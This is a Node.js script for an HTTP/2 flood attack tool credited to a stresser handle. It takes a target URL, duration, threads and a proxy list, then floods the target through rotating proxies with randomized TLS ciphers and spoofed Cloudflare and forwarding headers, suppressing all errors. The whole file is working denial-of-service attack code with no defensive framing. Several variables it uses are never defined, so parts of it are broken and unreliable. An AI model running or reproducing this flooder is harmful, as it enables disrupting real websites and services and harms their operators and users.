const fs = require('fs');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const cluster = require('cluster');

process.on('uncaughtException', function (error) {});
process.on('unhandledRejection', function (error) {});

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

if (process.argv.length < 8) {
    console.log(`Usage: ${process.argv[1]} target time threads reqs proxyfile GET/PRI | MADE BY @MSIDSTRESS`)
    process.exit(1)
}

const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const reqs = process.argv[5];
const proxyfile = process.argv[6];
const mode = process.argv[7];
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\x0A');
const parsed = url.parse(target);
const payload = {};

if (cluster.isMaster) {
    console.log('Attack Started | FLOOD MADE BY [@MISDSTRESS]');
    for (let ads = 0; ads < threads; ads++) {
        cluster.fork();
    }
} else {
    const sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
    const cplist = [
        "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384"
    ];

    let cipper = "";

    function generatecipher() {
        cipper = cplist[Math.floor(Math.random() * cplist.length)]
    }

    function main() {
        generatecipher();
        payload[":method"] = "GET";
        payload["Referer"] = objetive;
        payload["User-Agent"] = headersUseragents[Math.floor(Math.random() * headersUseragents.length)];
        payload["Cache-Control"] = "no-cache, max-age=0";
        payload["Upgrade-Insecure-Requests"] = "1";
        payload["Content-Type"] = "application/x-www-form-urlencoded";
        payload["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
        payload["Accept-Encoding"] = "gzip, deflate";
        payload["Accept-Language"] = "en-US,en;q=0.9";
        payload["Cookie"] = "userLanguage=en";
        payload["Connection"] = "close";
        payload["Accept-Charset"] = acceptCharset;
        payload["Host"] = host;
        payload["Sec-Fetch-Dest"] = "document";
        payload["Sec-Fetch-Mode"] = "navigate";
        payload["Sec-Fetch-Site"] = "none";
        payload["Sec-Fetch-User"] = "?1";
        payload["X-Requested-With"] = "XMLHttpRequest";
        payload["Keep-Alive"] = String(Math.floor(Math.random() * 500) + 1000);
        payload["scheme"] = "https";
        payload["x-forwarded-proto"] = "https";
        payload["dnt"] = "1";
        payload["sec-gpc"] = "1";
        payload["cf-ray"] = "7fd05951dcaf3901-SJC";
        payload["pragma"] = "no-cache";
        payload["x-forwarded-for"] = "84.32.40.7";
        payload["cf-visitor"] = '{"scheme":"https"}';
        payload["cdn-loop"] = "cloudflare";
        payload["cf-connecting-ip"] = "84.32.40.7";
        payload["backendServers"] = "https://justloveyou-backend-api-server01.hf.space/v1";
        payload["cf-ipcountry"] = "LT";
        payload["upgrade-insecure-requests"] = "1";
        payload["proxy"] = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous";
        payload["client-control"] = "max-age=43200, s-max-age=43200";

        this.curve = "GREASE:X25519:x25519";
        this.sigalgs = sigalgs.join(':');
        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom;

        const keepAliveAgent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 50000,
            maxSockets: Infinity
        });

        function Started() {
            for (let b = 0; b < reqs; b++) {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
                let connection = http['get']({
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: "CONNECT",
                    agent: keepAliveAgent,
                    path: parsed.host + ":443"
                });
                connection.on('connect', function (res, socket, head) {
                    const client = http2.connect(parsed.href, {
                        createConnection: () => {
                            return tls.connect({
                                socket: socket,
                                ciphers: cipper,
                                host: parsed.host,
                                servername: parsed.host,
                                secure: true,
                                gzip: true,
                                followAllRedirects: true,
                                decodeEmails: false,
                                echdCurve: this.curve,
                                honorCipherOrder: true,
                                requestCert: true,
                                secureOptions: this.Opt,
                                sigalgs: this.sigalgs,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2']
                            }, () => {
                                setInterval(() => {
                                    client.request(payload);
                                    connection.on("response", () => {
                                        connection.close();
                                    })
                                    connection.end();
                                })
                            })
                        }
                    })
                });
                connection.end();
            }
        }
        setInterval(Started);
        setTimeout(function () {
            console.clear();
            console.log('Attack End');
            process.exit()
        }, time * 1000);
    }
    main();
      }
